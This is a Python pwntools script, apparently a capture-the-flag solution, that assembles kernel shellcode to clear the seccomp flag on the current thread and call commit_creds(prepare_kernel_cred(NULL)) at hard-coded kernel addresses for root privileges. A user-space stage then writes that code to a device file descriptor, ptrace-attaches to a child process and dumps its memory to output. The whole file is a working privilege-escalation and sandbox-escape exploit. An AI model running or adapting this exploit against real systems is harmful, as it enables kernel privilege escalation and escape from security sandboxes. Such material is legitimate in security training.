import sys
sys.path.append("..")

from pwn import context, shellcraft
from common import *
context(arch = 'amd64', os = 'linux')

kernel_assembly = f"""
/* current->thread_info.flags &= ~(1 << TIF_SECCOMP); */
mov     rdx, gs:0x15d00             /* runtime-relocated offsets */
mov     rax, [rdx]
and     ah, 0xfe
mov     [rdx], rax
/* commit_creds(prepare_kernel_cred(NULL)); */
xor     rdi, rdi
movabs  rsi, 0xffffffff81089660
call    rsi                         /* prepare_kernel_cred */
mov     rdi, rax
movabs  rsi, 0xffffffff81089310
call    rsi                         /* commit_creds */
ret
""".strip()

kernel_machine_code = dump_machine_code(kernel_assembly)

user_assembly = f"""
{shellcraft.amd64.pushstr(kernel_machine_code, append_null=False)}
{shellcraft.amd64.linux.write(3, "rsp", len(kernel_machine_code))}
/* Get current PID `cpid` */
{shellcraft.amd64.linux.getpid()}
/* Assume sub-process has PID `cpid + 1` */
lea     rbx, [rax + 1]
/* ptrace attach to sub-process */
{shellcraft.amd64.linux.syscall("SYS_ptrace", 'PTRACE_ATTACH', "rbx", 0, 0)}
/* wait sub-process to stop */
{shellcraft.amd64.linux.syscall("SYS_wait4", -1, 0, 0, 0)}
"""

for addr in range(0x404040, 0x4040a0, 0x8):
    # Peek sub-process's data and output
    user_assembly += shellcraft.amd64.linux.syscall("SYS_ptrace", 'PTRACE_PEEKDATA', "rbx", addr, 'rsp')
    user_assembly += shellcraft.amd64.linux.write(1, 'rsp', 8)

user_machine_code = dump_machine_code(user_assembly)

with open('shellcode.bin', 'wb') as f:
    f.write(user_machine_code)
    f.write(b'\xcc' * (0x1000 - len(user_machine_code)))